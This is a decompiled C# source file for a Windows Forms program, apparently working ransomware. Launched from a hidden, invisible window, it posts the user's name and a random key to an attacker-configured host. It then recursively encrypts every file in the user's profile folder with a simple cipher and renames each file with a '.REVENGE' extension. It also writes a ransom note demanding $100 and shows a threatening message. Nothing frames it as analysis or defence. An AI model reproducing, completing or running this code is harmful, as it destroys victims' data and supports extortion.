using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace Ransomeware;

public class Form1 : Form
{
	private string password = GeneratePassword(16);

	private static Random random = new Random();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		string[] files = Directory.GetFiles("C:\\Users\\" + Environment.UserName);
		string[] directories = Directory.GetDirectories("C:\\Users\\" + Environment.UserName);
		string requestUriString = "your host url, you can use glitch and express app example in readme";
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		httpWebRequest.ContentType = "application/json";
		httpWebRequest.Method = "POST";
		using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
		{
			string value = new JavaScriptSerializer().Serialize((object)new
			{
				user = Environment.UserName,
				pass = password
			});
			streamWriter.Write(value);
			streamWriter.Flush();
			streamWriter.Close();
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
		{
			streamReader.ReadToEnd();
		}
		string[] array = directories;
		foreach (string location in array)
		{
			try
			{
				encryptDirectory(location);
			}
			catch
			{
			}
		}
		string[] array2 = files;
		foreach (string text in array2)
		{
			try
			{
				byte[] bytes = Encrypt(File.ReadAllBytes(text), password);
				File.WriteAllBytes(text, bytes);
				File.Move(text, text + ".REVENGE");
			}
			catch
			{
			}
		}
		File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "//ReadToRestore.txt", "if you want to restore your files, send me 100$");
		MessageBox.Show("All your files gone, send me 100$ to restore your files or die", "GG", (MessageBoxButtons)0, (MessageBoxIcon)48);
	}

	private void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				Path.GetExtension(files[i]);
				byte[] bytes = Encrypt(File.ReadAllBytes(files[i]), password);
				File.WriteAllBytes(files[i], bytes);
				File.Move(files[i], files[i] + ".REVENGE");
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch
		{
		}
	}

	public static string GeneratePassword(int length)
	{
		return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	public static byte[] Encrypt(byte[] plaintext, string key)
	{
		byte[] array = new byte[plaintext.Length];
		key = key.Trim().ToUpper();
		int num = 0;
		int length = key.Length;
		for (int i = 0; i < plaintext.Length; i++)
		{
			num %= length;
			int num2 = key[num] - 65;
			array[i] = (byte)((plaintext[i] + num2) % 256);
			num++;
		}
		return array;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 0));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
